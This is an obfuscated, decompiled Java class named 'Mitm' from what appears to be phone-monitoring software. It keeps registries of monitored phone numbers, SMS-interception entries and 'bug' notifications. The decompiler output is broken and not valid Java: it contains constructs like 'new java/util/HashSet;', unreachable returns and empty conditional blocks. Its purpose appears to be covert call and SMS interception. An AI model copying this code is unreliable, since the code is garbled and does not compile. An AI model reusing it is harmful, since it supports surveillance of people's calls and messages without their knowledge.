package com.vvt.callmanager.ref;

import com.vvt.base.communication.SmsInterceptInfo;
import com.vvt.g.a;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;

public class f
{
  private static final boolean a = g.b;
  private static final boolean b = g.a;
  private static f c;
  private HashSet d;
  private HashSet e;
  private HashSet f;
  
  private f()
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.d = localHashSet;
    localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.e = localHashSet;
    localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.f = localHashSet;
  }
  
  public static f a()
  {
    f localf = c;
    if (localf == null)
    {
      localf = new com/vvt/callmanager/ref/f;
      localf.<init>();
      c = localf;
    }
    return c;
  }
  
  public boolean a(SmsInterceptInfo paramSmsInterceptInfo)
  {
    boolean bool1 = false;
    HashSet localHashSet1 = null;
    if (paramSmsInterceptInfo != null) {}
    synchronized (this.e)
    {
      localHashSet1 = this.e;
      bool1 = localHashSet1.add(paramSmsInterceptInfo);
      boolean bool2;
      if (bool1)
      {
        bool2 = a;
        if (!bool2) {}
      }
      do
      {
        return bool1;
        bool2 = a;
      } while (!bool2);
    }
  }
  
  public boolean a(BugNotification paramBugNotification)
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
    synchronized (this.f)
    {
      HashSet localHashSet2 = this.f;
      bool1 = localHashSet2.contains(paramBugNotification);
      if (bool1)
      {
        localHashSet2 = this.f;
        localHashSet2.remove(paramBugNotification);
      }
      localHashSet2 = this.f;
      bool1 = localHashSet2.add(paramBugNotification);
      boolean bool2 = b;
      if (bool2) {}
      bool2 = b;
      if (bool2) {}
      return bool1;
    }
  }
  
  public boolean a(MonitorNumber paramMonitorNumber)
  {
    boolean bool1 = false;
    HashSet localHashSet1 = null;
    synchronized (this.d)
    {
      String str = paramMonitorNumber.getPhoneNumber();
      boolean bool2;
      if (str != null)
      {
        str = a.a(str);
        int i = str.length();
        int j = 5;
        if (i >= j)
        {
          localHashSet1 = this.d;
          bool1 = localHashSet1.add(paramMonitorNumber);
          if (bool1)
          {
            bool2 = a;
            if (!bool2) {}
          }
        }
      }
      do
      {
        for (;;)
        {
          return bool1;
          bool2 = a;
          if (bool2)
          {
            continue;
            bool2 = a;
            if (!bool2) {}
          }
        }
        bool2 = a;
      } while (!bool2);
    }
  }
  
  public boolean a(String paramString)
  {
    synchronized (this.d)
    {
      Object localObject1 = this.d;
      Iterator localIterator = ((HashSet)localObject1).iterator();
      do
      {
        bool = localIterator.hasNext();
        if (!bool) {
          break;
        }
        localObject1 = localIterator.next();
        localObject1 = (MonitorNumber)localObject1;
        localObject1 = ((MonitorNumber)localObject1).getPhoneNumber();
        int i = 5;
        bool = a.a((String)localObject1, paramString, i);
      } while (!bool);
      boolean bool = true;
      return bool;
      bool = false;
      localObject1 = null;
    }
  }
  
  public MonitorNumber b(String paramString)
  {
    synchronized (this.d)
    {
      Object localObject1 = this.d;
      Iterator localIterator = ((HashSet)localObject1).iterator();
      boolean bool3;
      do
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject1 = localIterator.next();
        localObject1 = (MonitorNumber)localObject1;
        String str = ((MonitorNumber)localObject1).getPhoneNumber();
        boolean bool2 = b;
        if (bool2) {}
        int i = 5;
        bool3 = a.a(str, paramString, i);
      } while (!bool3);
      boolean bool4 = b;
      if (bool4) {}
      return (MonitorNumber)localObject1;
      boolean bool1 = b;
      if (bool1) {}
      bool1 = false;
      localObject1 = null;
    }
  }
  
  public HashSet b()
  {
    return this.e;
  }
  
  public boolean b(MonitorNumber paramMonitorNumber)
  {
    synchronized (this.d)
    {
      HashSet localHashSet2 = this.d;
      boolean bool1 = localHashSet2.remove(paramMonitorNumber);
      boolean bool2;
      if (bool1)
      {
        bool2 = a;
        if (!bool2) {}
      }
      do
      {
        return bool1;
        bool2 = a;
      } while (!bool2);
    }
  }
  
  public MonitorList c(String paramString)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    synchronized (this.d)
    {
      Object localObject1 = this.d;
      Iterator localIterator = ((HashSet)localObject1).iterator();
      boolean bool2;
      do
      {
        boolean bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject1 = localIterator.next();
        localObject1 = (MonitorNumber)localObject1;
        String str = ((MonitorNumber)localObject1).getOwnerPackage();
        bool2 = paramString.equals(str);
      } while (!bool2);
      localArrayList.add(localObject1);
    }
    MonitorList localMonitorList = new com/vvt/callmanager/ref/MonitorList;
    localMonitorList.<init>(localArrayList);
    return localMonitorList;
  }
  
  public HashSet c()
  {
    return this.f;
  }
  
  public boolean d(String paramString)
  {
    Iterator localIterator = null;
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    Object localObject5;
    synchronized (this.d)
    {
      Object localObject2 = this.d;
      localObject5 = ((HashSet)localObject2).iterator();
      boolean bool2;
      do
      {
        boolean bool1 = ((Iterator)localObject5).hasNext();
        if (!bool1) {
          break;
        }
        localObject2 = ((Iterator)localObject5).next();
        localObject2 = (MonitorNumber)localObject2;
        String str = ((MonitorNumber)localObject2).getOwnerPackage();
        bool2 = paramString.equals(str);
      } while (!bool2);
      ((ArrayList)localObject1).add(localObject2);
    }
    int i = ((ArrayList)localObject1).size();
    if (i > 0) {
      i = 1;
    }
    for (;;)
    {
      localIterator = ((ArrayList)localObject1).iterator();
      for (;;)
      {
        boolean bool3 = localIterator.hasNext();
        if (!bool3) {
          break;
        }
        localObject1 = this.d;
        localObject5 = localIterator.next();
        ((HashSet)localObject1).remove(localObject5);
      }
      return i;
      int j = 0;
      Object localObject4 = null;
    }
  }
  
  public SmsInterceptList e(String paramString)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    synchronized (this.e)
    {
      Object localObject1 = this.e;
      Iterator localIterator = ((HashSet)localObject1).iterator();
      boolean bool2;
      do
      {
        boolean bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject1 = localIterator.next();
        localObject1 = (SmsInterceptInfo)localObject1;
        String str = ((SmsInterceptInfo)localObject1).getOwnerPackage();
        bool2 = paramString.equals(str);
      } while (!bool2);
      localArrayList.add(localObject1);
    }
    SmsInterceptList localSmsInterceptList = new com/vvt/callmanager/ref/SmsInterceptList;
    localSmsInterceptList.<init>(localArrayList);
    return localSmsInterceptList;
  }
  
  public boolean f(String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
    boolean bool3 = false;
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    Object localObject5;
    synchronized (this.e)
    {
      Object localObject2 = this.e;
      localObject5 = ((HashSet)localObject2).iterator();
      do
      {
        bool1 = ((Iterator)localObject5).hasNext();
        if (!bool1) {
          break;
        }
        localObject2 = ((Iterator)localObject5).next();
        localObject2 = (SmsInterceptInfo)localObject2;
        bool4 = b;
        if (bool4) {}
        bool4 = b;
        if (bool4) {}
        String str = ((SmsInterceptInfo)localObject2).getOwnerPackage();
        bool4 = paramString.equals(str);
      } while (!bool4);
      boolean bool4 = a;
      if (bool4) {}
      ((ArrayList)localObject1).add(localObject2);
    }
    int i = ((ArrayList)localObject1).size();
    if (i > 0)
    {
      i = 1;
      bool3 = i;
    }
    localObject1 = ((ArrayList)localObject1).iterator();
    for (;;)
    {
      bool2 = ((Iterator)localObject1).hasNext();
      if (!bool2) {
        break;
      }
      Object localObject4 = ((Iterator)localObject1).next();
      localObject4 = (SmsInterceptInfo)localObject4;
      boolean bool5 = a;
      if (bool5) {}
      localObject5 = this.e;
      ((HashSet)localObject5).remove(localObject4);
    }
    boolean bool2 = b;
    if (bool2) {}
    return bool3;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/Mitm.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */